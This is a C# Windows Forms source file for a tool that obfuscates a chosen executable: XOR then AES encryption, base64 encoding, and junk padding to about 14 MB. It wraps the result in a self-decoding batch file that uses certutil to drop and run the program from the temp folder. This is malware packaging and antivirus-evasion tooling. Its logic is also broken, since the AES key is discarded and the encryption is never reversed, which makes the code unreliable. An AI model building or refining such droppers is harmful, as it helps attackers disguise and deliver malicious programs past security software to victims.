using System.Security.Cryptography;
using System.Text;

namespace WinFormsApp6
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.Filter = "Executable Files (*.exe)|*.exe|All Files (*.*)|*.*";
            openFileDialog1.FilterIndex = 1;
            openFileDialog1.RestoreDirectory = true;

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                guna2TextBox1.Text = openFileDialog1.FileName;
            }
        }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(guna2TextBox1.Text))
            {
                MessageBox.Show("Please select an executable file first.", "File Not Selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            string exeFilePath = guna2TextBox1.Text;
            byte[] exeBytes = File.ReadAllBytes(exeFilePath);
            byte[] xorKey = Encoding.UTF8.GetBytes("$XRO$ENCRYPTED$");
            byte[] xorEncryptedBytes = new byte[exeBytes.Length];
            for (int i = 0; i < exeBytes.Length; i++)
            {
                xorEncryptedBytes[i] = (byte)(exeBytes[i] ^ xorKey[i % xorKey.Length]);
            }
            byte[] aesKey;
            byte[] aesIV;
            byte[] aesEncryptedBytes;

            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.GenerateKey();
                aes.GenerateIV();
                aesKey = aes.Key;
                aesIV = aes.IV;

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (ICryptoTransform encryptor = aes.CreateEncryptor())
                    {
                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                        {
                            csEncrypt.Write(xorEncryptedBytes, 0, xorEncryptedBytes.Length);
                            csEncrypt.FlushFinalBlock();
                            aesEncryptedBytes = msEncrypt.ToArray();
                        }
                    }
                }
            }
            string base64EncryptedData = Convert.ToBase64String(aesEncryptedBytes);
            const int targetSizeMB = 14;
            const int bytesPerMB = 1024 * 1024;
            int currentSizeMB = (int)Math.Ceiling((double)base64EncryptedData.Length / bytesPerMB);
            int junkDataSize = (targetSizeMB - currentSizeMB) * bytesPerMB;
            string junkData = new string('A', junkDataSize);
            base64EncryptedData += junkData;

            string[] base64Lines = SplitIntoLines(base64EncryptedData, 80);

            string batFilePath = Path.Combine(Path.GetDirectoryName(exeFilePath), Path.GetFileNameWithoutExtension(exeFilePath) + ".bat");

            using (StreamWriter sw = new StreamWriter(batFilePath))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("setlocal");
                sw.WriteLine("certutil -decode \"%~f0\" \"%TEMP%\\encoded.exe\" >nul");
                sw.WriteLine("\"%TEMP%\\encoded.exe\"");
                sw.WriteLine("exit");

                foreach (string line in base64Lines)
                {
                    sw.WriteLine(line);
                }
            }

            richTextBox1.Text = base64EncryptedData;
            MessageBox.Show("Conversion and obfuscation complete. Saved as: " + batFilePath);
        }
        private string[] SplitIntoLines(string str, int maxLineLength)
        {
            return Enumerable.Range(0, (int)Math.Ceiling((double)str.Length / maxLineLength))
                             .Select(i => str.Substring(i * maxLineLength, Math.Min(maxLineLength, str.Length - i * maxLineLength)))
                             .ToArray();
        }




        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
